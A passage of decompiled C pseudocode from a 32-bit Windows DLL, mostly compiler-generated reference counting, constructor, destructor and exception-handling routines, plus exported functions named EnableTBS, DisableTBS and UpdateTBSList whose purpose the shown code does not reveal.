  unsigned int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]

  result = &loc_10064D03;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v15 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v15 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v13 = v7;
      v8 = (unsigned __int64)(unsigned int)v15 >> 29 != 0 ? -1 : 8 * v15;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        *v9 = v15;
        v10 = v9 + 1;
        `eh vector constructor iterator'(
          v9 + 1,
          8u,
          v15,
          (void (__thiscall *)(void *))sub_10002AF1,
          (void (__thiscall *)(void *))sub_10009F65);
      }
      else
      {
        v10 = 0;
      }
      v14 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = (char *)(v7 - (char *)v10);
        v12 = v10 + 1;
        while ( 1 )
        {
          sub_100021B1((int *)&v11[(_DWORD)v12], v12);
          ++v14;
          v12 += 2;
          if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
          v11 = (char *)(v13 - (char *)v10);
        }
        v7 = v13;
      }
      this[3] = v10;
      if ( v7 )
      {
        if ( *((_DWORD *)v7 - 1) )
          (**(void (__thiscall ***)(char *, int))v7)(v7, 3);
        else
          j__free(v7 - 4);
      }
      result = (void *)v15;
      this[2] = v15;
    }
  }
  return result;
}

//----- (100027A6) --------------------------------------------------------
_DWORD *__usercall sub_100027A6@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (100027E6) --------------------------------------------------------
void __thiscall sub_100027E6(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002C0B((int)this);
}

//----- (1000281F) --------------------------------------------------------
void __thiscall sub_1000281F(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002C33((int)this);
}

//----- (10002858) --------------------------------------------------------
void __thiscall sub_10002858(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002C5B((int)this);
}

//----- (10002891) --------------------------------------------------------
void __thiscall sub_10002891(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002C83((int)this);
}

//----- (100028CA) --------------------------------------------------------
_DWORD *__usercall sub_100028CA@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (100028DE) --------------------------------------------------------
_DWORD *__userpurge sub_100028DE@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10002922) --------------------------------------------------------
void __thiscall sub_10002922(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002CBD((int)this);
}

//----- (10002972) --------------------------------------------------------
_DWORD *__userpurge sub_10002972@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100029B6) --------------------------------------------------------
void __thiscall sub_100029B6(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002CF7((int)this);
}

//----- (10002A09) --------------------------------------------------------
_DWORD *__userpurge sub_10002A09@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10002A4D) --------------------------------------------------------
void __thiscall sub_10002A4D(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10002D31((int)this);
}

//----- (10002A8C) --------------------------------------------------------
_DWORD *__thiscall sub_10002A8C(_DWORD *Block, char a2)
{
  sub_100022C5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002AA8) --------------------------------------------------------
char *__thiscall sub_10002AA8(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 8u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_10009F65);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_10009F65((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (10002AF1) --------------------------------------------------------
void __thiscall sub_10002AF1(_DWORD *this)
{
  sub_10009D2C(this, &word_10091B88);
}

//----- (10002AFD) --------------------------------------------------------
char *__usercall sub_10002AFD@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_100027E6);
  j__free(v1);
  return v1;
}

//----- (10002B1B) --------------------------------------------------------
_DWORD *__stdcall sub_10002B1B(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_100729C4;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100729C4: using guessed type int (__thiscall *off_100729C4)(void *Block, char);

//----- (10002B4A) --------------------------------------------------------
LONG __usercall sub_10002B4A@<eax>(int *a1@<esi>)
{
  LONG result; // eax
  void *v2; // eax
  int v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x24u);
      if ( v2 )
        v3 = sub_10009B1B((int)v2, *a1);
      else
        v3 = 0;
      *a1 = v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}

//----- (10002B9E) --------------------------------------------------------
void __usercall sub_10002B9E(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(
      v4 + 1,
      8u,
      a2,
      (void (__thiscall *)(void *))sub_10002AF1,
      (void (__thiscall *)(void *))sub_10009F65);
  }
  a1[3] = v2;
}

//----- (10002C0B) --------------------------------------------------------
void __usercall sub_10002C0B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002C33) --------------------------------------------------------
void __usercall sub_10002C33(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002C5B) --------------------------------------------------------
void __usercall sub_10002C5B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002C83) --------------------------------------------------------
void __usercall sub_10002C83(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002CBD) --------------------------------------------------------
void __usercall sub_10002CBD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002CF7) --------------------------------------------------------
void __usercall sub_10002CF7(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002D31) --------------------------------------------------------
void __usercall sub_10002D31(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10002D88) --------------------------------------------------------
_DWORD *__stdcall sub_10002D88(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10072BE0;
  return a1;
}
// 10072BE0: using guessed type int (__thiscall *off_10072BE0)(void *Block, char);

//----- (10002DBC) --------------------------------------------------------
void __thiscall sub_10002DBC(_DWORD *this)
{
  *this = &off_10072BE0;
  sub_1000DF1A(this);
}
// 10072BE0: using guessed type int (__thiscall *off_10072BE0)(void *Block, char);

//----- (10002DE5) --------------------------------------------------------
_DWORD *__thiscall sub_10002DE5(_DWORD *Block, char a2)
{
  sub_10002DBC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002E2C) --------------------------------------------------------
_DWORD *__stdcall sub_10002E2C(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10072BE8;
  *a1 = &off_10072BF0;
  return result;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);
// 10072BF0: using guessed type int (__thiscall *off_10072BF0)(void *Block, char);

//----- (10002E5B) --------------------------------------------------------
_DWORD *__thiscall sub_10002E5B(_DWORD *Block, char a2)
{
  sub_10002E78(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002E78) --------------------------------------------------------
_DWORD *__stdcall sub_10002E78(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10072BE8;
  return result;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);

//----- (10002E9D) --------------------------------------------------------
int __cdecl EnableTBS(int a1)
{
  void *v2; // eax
  int v3; // eax
  int v4; // esi
  int v5; // [esp+0h] [ebp-D4h] BYREF
  int v6; // [esp+4h] [ebp-D0h]
  int v7[31]; // [esp+Ch] [ebp-C8h] BYREF
  char v8[12]; // [esp+88h] [ebp-4Ch] BYREF
  int v9[3]; // [esp+94h] [ebp-40h] BYREF
  int v10[2]; // [esp+B0h] [ebp-24h] BYREF
  int v11[2]; // [esp+B8h] [ebp-1Ch] BYREF
  char v12[4]; // [esp+C0h] [ebp-14h] BYREF
  int *v13; // [esp+C4h] [ebp-10h]
  int v14; // [esp+D0h] [ebp-4h]

  v13 = &v5;
  sub_10011EED();
  v14 = 0;
  sub_1000FC57();
  LOBYTE(v14) = 1;
  if ( (unsigned int)(sub_1000F73F() - 6) <= 7 )
  {
    if ( (unsigned __int8)sub_10003BF9() == 1 )
    {
      v14 = -1;
      sub_10011F2B(v5, v6);
      return 0;
    }
    sub_10003044(v12);
    LOBYTE(v14) = 2;
    sub_1000FD49(v5, v6);
    sub_1000EF5A((int)v9, 1, 1);
    LOBYTE(v14) = 4;
    sub_1000346A(v11, a1);
    LOBYTE(v14) = 5;
    v2 = operator new(0x14u);
    v10[1] = (int)v2;
    LOBYTE(v14) = 6;
    if ( v2 )
      v3 = sub_1000C28D(v2, 0);
    else
      v3 = 0;
    LOBYTE(v14) = 5;
    sub_10003148(v3);
    LOBYTE(v14) = 7;
    v4 = v10[0];
    sub_1000C79D(0, *(_DWORD *)(v11[0] + 12));
    sub_1000C5DF(v4);
    sub_10012051((int)v7, (int)v9, v4, (void *)(a1 + *(_DWORD *)(v4 + 12)));
    LOBYTE(v14) = 8;
    sub_1001241E(v7, v8);
    LOBYTE(v14) = 8;
    sub_1000F307(v5, v6);
    LOBYTE(v14) = 7;
    sub_100122DB(v5, v6);
    LOBYTE(v14) = 5;
    sub_1000318C(v10);
    LOBYTE(v14) = 4;
    sub_1000318C(v11);
    v14 = 2;
    sub_1000F027(v5, v6);
    LOBYTE(v14) = 1;
    sub_10003077(v12);
    v14 = 0;
  }
  v14 = -1;
  sub_10011F2B(v5, v6);
  return 1;
}
// 10003044: using guessed type _DWORD __stdcall sub_10003044(_DWORD);
// 10003077: using guessed type _DWORD __stdcall sub_10003077(_DWORD);
// 10003148: using guessed type _DWORD __stdcall sub_10003148(_DWORD);
// 1000318C: using guessed type int __thiscall sub_1000318C(_DWORD);
// 1000346A: using guessed type _DWORD __cdecl sub_1000346A(_DWORD, _DWORD);
// 10003BF9: using guessed type int sub_10003BF9(void);
// 1000C28D: using guessed type _DWORD __stdcall sub_1000C28D(_DWORD, _DWORD);
// 1000C5DF: using guessed type _DWORD __stdcall sub_1000C5DF(_DWORD);
// 1000F027: using guessed type _DWORD __cdecl sub_1000F027(_DWORD, _DWORD);
// 1000F307: using guessed type _DWORD __cdecl sub_1000F307(_DWORD, _DWORD);
// 1000F73F: using guessed type int sub_1000F73F(void);
// 1000FC57: using guessed type int sub_1000FC57(void);
// 1000FD49: using guessed type _DWORD __cdecl sub_1000FD49(_DWORD, _DWORD);
// 10011EED: using guessed type int sub_10011EED(void);
// 10011F2B: using guessed type _DWORD __cdecl sub_10011F2B(_DWORD, _DWORD);
// 100122DB: using guessed type _DWORD __cdecl sub_100122DB(_DWORD, _DWORD);
// 1001241E: using guessed type _DWORD __stdcall sub_1001241E(_DWORD, _DWORD);
// 10002E9D: using guessed type char var_14[4];
// 10002E9D: using guessed type char var_4C[12];

//----- (10003044) --------------------------------------------------------
_DWORD *__stdcall sub_10003044(_DWORD *a1)
{
  sub_10002E2C(a1);
  *a1 = &off_10072BF8;
  return a1;
}
// 10072BF8: using guessed type int (__thiscall *off_10072BF8)(void *Block, char);

//----- (10003077) --------------------------------------------------------
_DWORD *__stdcall sub_10003077(_DWORD *a1)
{
  return sub_10002E78(a1);
}

//----- (1000309B) --------------------------------------------------------
_DWORD *__thiscall sub_1000309B(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10072BE0;
  return this;
}
// 10072BE0: using guessed type int (__thiscall *off_10072BE0)(void *Block, char);

//----- (100030D3) --------------------------------------------------------
_DWORD *__thiscall sub_100030D3(_DWORD *Block, char a2)
{
  sub_10003077(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100030F0) --------------------------------------------------------
int DisableTBS()
{
  _DWORD v1[7]; // [esp+0h] [ebp-28h] BYREF
  int v2; // [esp+24h] [ebp-4h]

  v1[6] = v1;
  v2 = 0;
  sub_10011EED();
  LOBYTE(v2) = 1;
  sub_1000FC57();
  sub_10003428();
  LOBYTE(v2) = 0;
  sub_10011F2B(v1[0], v1[1]);
  return 1;
}
// 10003428: using guessed type int sub_10003428(void);
// 1000FC57: using guessed type int sub_1000FC57(void);
// 10011EED: using guessed type int sub_10011EED(void);
// 10011F2B: using guessed type _DWORD __cdecl sub_10011F2B(_DWORD, _DWORD);

//----- (10003148) --------------------------------------------------------
_DWORD *__userpurge sub_10003148@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000318C) --------------------------------------------------------
void __thiscall sub_1000318C(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100031CB((int)this);
}

//----- (100031CB) --------------------------------------------------------
void __usercall sub_100031CB(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100031FA) --------------------------------------------------------
int __stdcall sub_100031FA(int a1)
{
  return sub_100031FE(a1);
}
// 100031FE: using guessed type int __stdcall sub_100031FE(_DWORD);

//----- (100031FE) --------------------------------------------------------
int __userpurge sub_100031FE@<eax>(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int pExceptionObject,
        int a24,
        _DWORD *a25,
        int a26,
        int a27,
        int a28,
        void **a29)
{
  _BYTE *v29; // eax
  int v31[5]; // [esp-14h] [ebp-88h] BYREF
  int v32; // [esp+0h] [ebp-74h] BYREF
  _DWORD v33[23]; // [esp+Ch] [ebp-68h] BYREF
  int v34; // [esp+70h] [ebp-4h]
  int vars0; // [esp+74h] [ebp+0h] BYREF

  v33[22] = &v32;
  v29 = sub_1000EF5A(dword_10095444, &a20, 1, 1u);
  v34 = 0;
  sub_1000F1C5((int)v29, dword_1009544C);
  v34 = -1;
  sub_1000F027(&a20);
  sub_1000346A(&a25, a29);
  v34 = 1;
  sub_100035BB();
  a29 = (void **)v31;
  sub_1000C3F3(a25, (int)v31);
  LOBYTE(v34) = 1;
  sub_10001230(dword_10091C08, v31[0], v31[1], v31[2], v31[3], v31[4]);
  sub_10008AC0(&a29);
  LOBYTE(v34) = 3;
  sub_10006D65(&vars0);
  LOBYTE(v34) = 4;
  sub_10008BE6(v33);
  LOBYTE(v34) = 5;
  if ( sub_10003BF9() )
  {
    sub_1000DF56(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVLahgnutrUrbccmcrf_sr__);
  }
  sub_10008B1B();
  sub_10007010(&vars0);
  sub_10007010(v33);
  LOBYTE(v34) = 6;
  sub_10014CC5((int)dword_1009544C, 1000, 0);
  LOBYTE(v34) = 4;
  sub_10008C82(v33);
  LOBYTE(v34) = 3;
  sub_10006DB4(&vars0);
  a29 = (void **)&off_100731CC;
  v34 = -1;
  sub_1000318C(&a25);
  return 1;
}
// 100731CC: using guessed type int (*off_100731CC)();
// 10091C08: using guessed type int dword_10091C08;
// 10095444: using guessed type _DWORD dword_10095444[2];
// 1009544C: using guessed type int dword_1009544C[3];

//----- (10003347) --------------------------------------------------------
_DWORD *__thiscall sub_10003347(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10072C00;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10072C00: using guessed type int (__thiscall *off_10072C00)(void *Block, char);

//----- (10003388) --------------------------------------------------------
_DWORD *__thiscall sub_10003388(_DWORD *Block, char a2)
{
  sub_1000DF88(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100033A4) --------------------------------------------------------
DWORD __stdcall UpdateTBSList(int a1)
{
  int v2; // [esp+0h] [ebp-20h] BYREF
  DWORD dwExitCode; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  v5 = 0;
  dwExitCode = sub_100126D5(a1);
  sub_1000F027(dword_1009544C);
  v5 = -1;
  sub_10013436(dwExitCode);
  return dwExitCode;
}
// 1009544C: using guessed type int dword_1009544C[3];

//----- (1000340C) --------------------------------------------------------
int *__thiscall sub_1000340C(int *Block, char a2)
{
  sub_1000F027(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10003428) --------------------------------------------------------
void sub_10003428()
{
  _BYTE *v0; // eax
  int v1[3]; // [esp+0h] [ebp-18h] BYREF
  int v2; // [esp+14h] [ebp-4h]

  v0 = sub_1000EF5A(dword_10095444, v1, 1, 1u);
  v2 = 0;
  (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)v0 + 16))(v0);
  v2 = -1;
  sub_1000F027(v1);
}
// 10095444: using guessed type _DWORD dword_10095444[2];

//----- (1000346A) --------------------------------------------------------
_DWORD *__cdecl sub_1000346A(_DWORD *a1, void **a2)
{
  void *v2; // ebx
  void *v3; // eax
  int v4; // eax
  int v6; // [esp+0h] [ebp-28h] BYREF
  void *Block; // [esp+Ch] [ebp-1Ch]
  int v8; // [esp+14h] [ebp-14h]
  int *v9; // [esp+18h] [ebp-10h]
  int v10; // [esp+24h] [ebp-4h]

  v9 = &v6;
  v8 = 0;
  v10 = 1;
  v2 = *a2;
  v3 = operator new(0x14u);
  Block = v3;
  LOBYTE(v10) = 2;
  if ( v3 )
    v4 = sub_1000C28D(v2, (int)v3, a2 + 1);
  else
    v4 = 0;
  LOBYTE(v10) = 1;
  sub_10003148(a1, v4);
  return a1;
}

//----- (100034EF) --------------------------------------------------------
void *__thiscall sub_100034EF(_DWORD *this)
{
  void *result; // eax
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_1006205D;
  v3[3] = v3;
  *this = &off_10072C08;
  v3[6] = 0;
  v2 = (void *)this[1];
  if ( v2 )
    return sub_1000354F(v2);
  return result;
}
// 10072C08: using guessed type int (__thiscall *off_10072C08)(void *Block, char);

//----- (10003533) --------------------------------------------------------
_DWORD *__thiscall sub_10003533(_DWORD *Block, char a2)
{
  sub_100034EF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000354F) --------------------------------------------------------
void *__usercall sub_1000354F@<eax>(void *a1@<esi>)
{
  int *v2; // [esp+0h] [ebp-4h]

  sub_1000355F(v2);
  j__free(a1);
  return a1;
}
// 10003550: variable 'v2' is possibly undefined

//----- (1000355F) --------------------------------------------------------
void __stdcall sub_1000355F(int *a1)
{
  sub_100010A5(a1);
}

//----- (10003597) --------------------------------------------------------
int __stdcall sub_10003597(int a1)
{
  sub_100035BB();
  return a1;
}

//----- (100035BB) --------------------------------------------------------
int sub_100035BB()
{
  int v0; // ecx
  int result; // eax
  void *v2; // eax
  int v3; // ecx
  int v4; // [esp-8h] [ebp-28h] BYREF
  int v5; // [esp-4h] [ebp-24h]
  void *v6[3]; // [esp+4h] [ebp-1Ch] BYREF
  void *Block; // [esp+10h] [ebp-10h] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  v0 = dword_10091C08;
  result = _InterlockedExchange((volatile __int32 *)&Block, (__int32)&loc_100669EF);
  if ( !v0 )
  {
    sub_10012C8B(dword_100957B4, v6);
    v8 = 0;
    if ( !dword_10091C08 )
    {
      v2 = operator new(0x8Cu);
      Block = v2;
      LOBYTE(v8) = 1;
      if ( v2 )
      {
        v4 = v5;
        v6[2] = &v4;
        sub_10009F32(&v4, (int)&unk_100950F0);
        LOBYTE(v8) = 1;
        v2 = (void *)sub_10001130((int)Block, v4, v5);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v8) = 0;
      _InterlockedExchange((volatile __int32 *)&Block, (__int32)v2);
      dword_10091C08 = v3;
      dword_1009241C = v3;
    }
    v8 = -1;
    return sub_10012CBF(v6);
  }
  return result;
}
// 10091C08: using guessed type int dword_10091C08;
// 1009241C: using guessed type int dword_1009241C;
// 100957B4: using guessed type int dword_100957B4[9];

//----- (10003686) --------------------------------------------------------
int __stdcall sub_10003686(int a1, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax

  *(_DWORD *)a1 = off_10072C34;
  *(_BYTE *)(a1 + 4) = 1;
  sub_10009F32((_DWORD *)(a1 + 8), (int)&unk_100950F8);
  v2 = operator new(0x2Cu);
  if ( v2 )
    v3 = sub_10014F3E(a2, v2);
  else
    v3 = 0;
  sub_100038D0((_DWORD *)(a1 + 16), (int)v3);
  return a1;
}
// 10072C34: using guessed type int (*off_10072C34[5])();

//----- (100036FC) --------------------------------------------------------
_DWORD *__thiscall sub_100036FC(int this, void *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *result; // eax
  int v6[5]; // [esp+8h] [ebp-28h] BYREF
  void *Block; // [esp+1Ch] [ebp-14h]
  int v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v8 = 0;
  Block = operator new(0x2Cu);
  v9 = 0;
  if ( Block )
  {
    v3 = (_DWORD *)sub_1000C28D(a2, (int)v6, 0);
    LOBYTE(v9) = 1;
    v8 = 1;
    v4 = sub_10014F3E(v3, Block);
  }
  else
  {
    v4 = 0;
  }
  v9 = 2;
  result = sub_10003914((_DWORD *)(this + 16), (int)v4);
  v9 = -1;
  if ( (v8 & 1) != 0 )
  {
    v8 &= ~1u;
    result = (_DWORD *)sub_1000C45D(v6);
  }
  *(_BYTE *)(this + 4) = 1;
  return result;
}
// 100036FC: using guessed type int var_28[5];

//----- (10003787) --------------------------------------------------------
_DWORD *__thiscall sub_10003787(int this)
{
  _DWORD *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  if ( !*(_BYTE *)(this + 4) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  result = sub_10003914((_DWORD *)(this + 16), 0);
  *(_BYTE *)(this + 4) = 0;
  return result;
}

//----- (100037BD) --------------------------------------------------------
char __thiscall sub_100037BD(_BYTE *this)
{
  return this[4];
}

//----- (100037C1) --------------------------------------------------------
void __thiscall sub_100037C1(_BYTE *this)
{
  _BYTE *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( !this[4] )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
}

//----- (100037E3) --------------------------------------------------------
void __thiscall sub_100037E3(_BYTE *this)
{
  _BYTE *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( !this[4] )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
}

//----- (10003805) --------------------------------------------------------
int __thiscall sub_10003805(int this)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this + 16);
}

//----- (1000382A) --------------------------------------------------------
int __thiscall sub_1000382A(int this)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this + 16) != 0 ? *(_DWORD *)(this + 16) + 8 : 0;
}

//----- (10003858) --------------------------------------------------------
_DWORD *__thiscall sub_10003858(void *this, _DWORD *a2)
{
  sub_10009F32(a2, (int)this + 8);
  return a2;
}

//----- (1000388F) --------------------------------------------------------
int __thiscall sub_1000388F(int this)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(*(_DWORD *)(this + 16) + 40);
}

//----- (100038B7) --------------------------------------------------------
unsigned int __thiscall sub_100038B7(_DWORD *this, void *a2)
{
  _DWORD *v2; // esi
  unsigned int result; // eax

  v2 = (_DWORD *)this[4];
  result = sub_10015252(v2, a2);
  v2[10] = a2;
  return result;
}

//----- (100038D0) --------------------------------------------------------
_DWORD *__userpurge sub_100038D0@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
